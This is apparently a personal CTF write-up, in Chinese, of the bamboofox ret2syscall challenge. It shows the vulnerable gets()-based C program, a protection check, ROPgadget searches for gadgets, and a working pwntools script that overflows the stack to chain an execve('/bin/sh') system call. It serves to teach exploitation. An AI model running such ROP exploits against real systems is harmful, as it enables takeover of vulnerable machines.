---
title: bamboofox-ret2syscall-rop
updated: 2023-05-30 13:51:13Z
created: 2022-10-10 03:20:22Z
---

```c
#include <stdio.h>
#include <stdlib.h>

char *shell = "/bin/sh";

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);
    
    char buf[100];

    printf("This time, no system() and NO SHELLCODE!!!\n");
    printf("What do you plan to do?\n");
    gets(buf);

    return 0;
}
```

检查保护

可以看到开启了NX（不可执行）保护

```sh
└─# checksec rop    
[*] '/root/pwn/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

查看源码

![1e88d535f02e7bbff8c6859b8db931b9.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1e88d535f02e7bbff8c6859b8db931b9.png)

由于开启了NX保护，无法将shellcode部署到内存中，故而尝试调用系统函数获得shell

尝试通过溢出调用执行`execve("/bin/sh",NULL,NULL)`获得shell

`execve("/bin/sh",NULL,NULL)`的指令如下

```asm
mov eax, 0xb

mov ebx, [“/bin/sh”]

mov ecx, 0

mov edx, 0

int 0x80
```

**x86 通过 int 0x80 指令进行系统调用**

**amd64 通过 syscall 指令进行系统调用**

这里使用ropgadget寻找合适的片段

首先查找eax

```sh
└─# ROPgadget --binary rop --only='pop|ret' |grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

这里选择 `0x080bb196 : pop eax ; ret`

接下来寻找ebx,ecx,edx

```sh
└─# ROPgadget --binary rop --only='pop|ret' |grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

这里选择`0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret` ，可以一次性控制ebx,ecx,edx三个寄存器

接下来寻找/bin/sh字段

```sh
└─# ROPgadget --binary rop --string='/bin/sh'           
Strings information
============================================================
0x080be408 : /bin/sh
```

最后寻找中断指令int 0x80

```sh
└─# ROPgadget --binary rop --only='int'     
Gadgets information
============================================================
0x08049421 : int 0x80
```

所以总的就是

```python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
bin_sh = 0x80be408
payload = flat([b'a' * 0x70,  pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

执行结果如下所示

![a853f3cfa10b02ca4dbed505dcef59e3.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a853f3cfa10b02ca4dbed505dcef59e3.png)